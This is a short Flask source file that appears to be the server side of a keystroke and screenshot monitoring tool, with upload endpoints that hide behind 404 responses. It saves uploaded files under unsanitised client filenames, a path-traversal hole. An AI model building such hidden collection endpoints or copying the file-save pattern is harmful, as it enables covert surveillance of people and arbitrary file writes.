from flask import render_template, request, Blueprint, current_app, session, url_for, redirect
from safenet_app import app, auth
from PIL import Image
import requests, os

administration = Blueprint('administration', __name__)


@administration.route("/dashboard", methods=['GET'])
def dashboard():

    return render_template("dashboard.html")


@administration.route("/dashboard/screenshot", methods=['POST', 'GET'])
def screenshot():

    return render_template("screenshots.html")

@administration.route("/dashboard/keystrokes", methods=['POST', 'GET'])
def keystrokes():
    return render_template("keystrokes.html")


# https://stackoverflow.com/questions/10434599/get-the-data-received-in-a-flask-request
@administration.route("/api/v1/log", methods=['POST', 'GET'])
def api_log():
    if request.files:
        log = request.files['upload_file'].read().decode("utf-8")
        print(log)
        # f = open(request.files['upload_file'], 'wb')
    return render_template('errors/404.html', log=log)


@administration.route("/api/v1/image", methods=['POST', 'GET'])
def api_screenshot():
    if request.files:
        # print(request.files['upload_file'].read())
        # f = open(request.files['upload_file'], 'wb')
        im = Image.open(request.files['upload_file'])
        im.save(app.root_path + "/static/images/screenshot/" + request.files['upload_file'].filename)
    return render_template('errors/404.html')



# @administration.route("/api/v1/gettext", methods=['POST', 'GET'])
# def api_text():
#     files = {'upload_file': open('log.txt','rb')}
    
#     r = requests.post("http://127.0.0.1:5000/api/v1/log", files=files)

#     return render_template("keystrokes.html")


# @administration.route("/api/v1/getimage", methods=['POST', 'GET'])
# def api_image():
#     files = {'upload_file': open('internet.jpg','rb')}
    
#     r = requests.post("http://127.0.0.1:5000/api/v1/image", files=files)

#     return render_template("keystrokes.html")


